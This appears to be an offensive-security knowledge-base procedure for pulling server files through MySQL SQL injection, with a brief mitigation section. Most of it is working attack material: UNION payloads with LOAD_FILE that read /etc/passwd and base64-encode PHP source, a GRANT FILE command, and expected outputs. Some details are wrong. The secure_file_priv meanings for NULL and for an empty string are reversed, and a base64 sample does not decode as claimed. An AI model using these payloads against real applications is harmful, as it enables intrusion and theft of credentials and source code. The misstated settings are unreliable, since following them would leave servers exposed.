---
id: 8838e226-1119-4892-8eef-b3a2a3c48eb5
name: mysql-file-content-extraction-via-injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:34.775623+00:00'
updated_at: '2023-04-10T20:22:51.242098+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - mysql-injection
  - file-exfiltration
  - load-file
commands:
  - '[[commands/mysql-check-file-privilege]]'
  - '[[commands/mysql-grant-file-privilege]]'
  - '[[commands/mysql-select-load-file]]'
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# mysql-file-content-extraction-via-injection

## Summary

This procedure outlines how to extract the contents of arbitrary files from a MySQL server filesystem using SQL injection vulnerabilities to invoke the LOAD_FILE() function. It is useful in scenarios where an attacker has identified a UNION-based or error-based SQL injection point in a web application backed by MySQL, allowing read access to sensitive files like /etc/passwd or configuration files, provided the database user has the FILE privilege.

## Description

MySQL's LOAD_FILE() function allows reading the contents of a file on the server if the database user possesses the FILE privilege and the file is not restricted by the secure_file_priv setting. In an SQL injection attack, this can be exploited by appending a UNION SELECT statement to a vulnerable query, enabling the attacker to retrieve file data as part of the result set. This technique is particularly effective against Linux/Unix servers hosting web applications, where common files like /etc/passwd, /var/www/html/config.php, or SSH keys may be accessible. Limitations include: the file must be readable by the MySQL process, paths must be known or guessed, and large files may be truncated. This procedure assumes a confirmed SQLi vulnerability and focuses on the extraction phase, building on reconnaissance to identify injectable parameters.

## Requirements

1. Confirmed SQL injection vulnerability in a MySQL-backed web application (UNION or blind exploitation capable).
2. Knowledge of target file paths (e.g., /etc/passwd for user enumeration, /var/www/html/index.php for source code).
3. Access to a proxy or tool like Burp Suite for manual injection, or sqlmap for automated testing.
4. The MySQL user must have FILE privilege; if not, administrative access may be needed to grant it (rare in injection scenarios).
5. Awareness of secure_file_priv configuration, which may restrict file access to a specific directory.

## Defense

Defensive measures and detection strategies:

- Apply least privilege to MySQL users: Avoid granting FILE to application accounts; use dedicated read-only users without file access.
- Enable secure_file_priv in my.cnf to limit LOAD_FILE/INFILE to a safe directory or disable entirely (set to empty string).
- Use prepared statements and parameterized queries in application code to prevent SQL injection.
- Monitor MySQL error logs and general query logs for LOAD_FILE, UNION SELECT with file paths, or privilege grants.
- Implement web application firewall (WAF) rules to block injection payloads containing LOAD_FILE or base64 encodings.
- Regularly audit file permissions on the server to ensure sensitive files are not readable by the MySQL process (e.g., mysql user).

## Objectives

1. Verify the database user's FILE privilege and secure_file_priv restrictions via injection.
2. If possible, escalate privileges to enable file read access (requires high privileges).
3. Extract and retrieve contents of target files using LOAD_FILE in an injected query.
4. Handle output encoding (e.g., base64) for binary or large files to avoid truncation or injection failures.

## Instructions

### Step 1: Check FILE Privilege and Secure File Priv

**Context**: Before attempting file extraction, confirm if the current MySQL user has the FILE privilege and check the secure_file_priv setting. This prevents errors during LOAD_FILE execution. In an injection scenario, append this to the vulnerable parameter.

**Command** ([[commands/mysql-check-file-privilege]]):
```sql
SHOW GRANTS FOR CURRENT_USER();
```

> This command displays the privileges for the current user. Look for 'FILE ON *.*' in the output. If absent, file reads will fail. Alternatively, query @@secure_file_priv to see restrictions: SELECT @@secure_file_priv; If set to a directory, files must be within it; if NULL, no restrictions.

**Expected Output**: A result set showing grants, e.g., "GRANT USAGE ON *.* TO 'app_user'@'localhost'" and if present, "GRANT FILE ON *.* TO 'app_user'@'localhost'". For secure_file_priv: A path like "/var/lib/mysql-files/" or NULL.

If FILE privilege is missing, proceed to Step 2 if administrative injection is possible; otherwise, extraction may not be feasible.

### Step 2: Grant FILE Privilege (If Administrative Access Available)

**Context**: If the injecting user has sufficient privileges (e.g., GRANT OPTION), inject a command to grant FILE privilege to the current or root user. This is uncommon in standard SQLi but possible if the app uses a high-priv account. Use caution as this alters the database.

**Command** ([[commands/mysql-grant-file-privilege]]):
```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;
```

> This grants FILE privilege to the root user on localhost and reloads privileges. In injection, wrap in UNION or execute directly if possible. Verify with Step 1 afterward.

**Expected Output**: Success message: "Query OK, 0 rows affected (0.01 sec)" followed by privileges reloaded.

If grant fails due to insufficient privileges, skip to extraction with existing perms or abandon if LOAD_FILE is blocked.

### Step 3: Extract File Contents Using LOAD_FILE

**Context**: With privileges confirmed, inject a UNION SELECT using LOAD_FILE to read the target file. Start with a known file like /etc/passwd for testing. For web files, use base64 encoding to handle special characters.

**Command** ([[commands/mysql-select-load-file]]):
```sql
SELECT LOAD_FILE('/etc/passwd');
```

> This directly selects the file contents. In SQLi, use a payload like the one below. If the file is large or binary, pipe through TO_BASE64 for safe retrieval.

**Code** ([[codes/mysql-injection-payload-load-file-passwd]]):
```sql
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
```

> Inject this payload into a vulnerable string parameter (e.g., id=1' UNION ALL SELECT LOAD_FILE('/etc/passwd') --). The -- comments out the rest of the query.

**Expected Output**: The contents of /etc/passwd displayed in the application response, e.g., "root:x:0:0:root:/root:/bin/bash\ndao:x:1000:1000:dao:/home/dao:/bin/bash".

For PHP source extraction with encoding:

**Code** ([[codes/mysql-injection-payload-base64-load-file-php]]):
```sql
UNION ALL SELECT TO_BASE64(LOAD_FILE('/var/www/html/index.php'));
```

> This encodes the file in base64 to prevent injection breaks from special chars. Decode the output manually (e.g., base64 -d).

**Expected Output**: Base64-encoded string of the PHP file contents, e.g., "PD9waHAgZWNmbyAnSGVsbG8gV29ybGQnOyA/PiIK" which decodes to "<?php echo 'Hello World'; ?>".

### Step 4: Handle Errors and Verify Success

**Context**: Common errors include privilege denial or secure_file_priv blocks. Test with a small file first and iterate paths if needed.

If error 1045 (access denied) or 1290 (secure_file_priv), revisit privileges or restrictions. Success is confirmed by receiving file data without SQL errors.
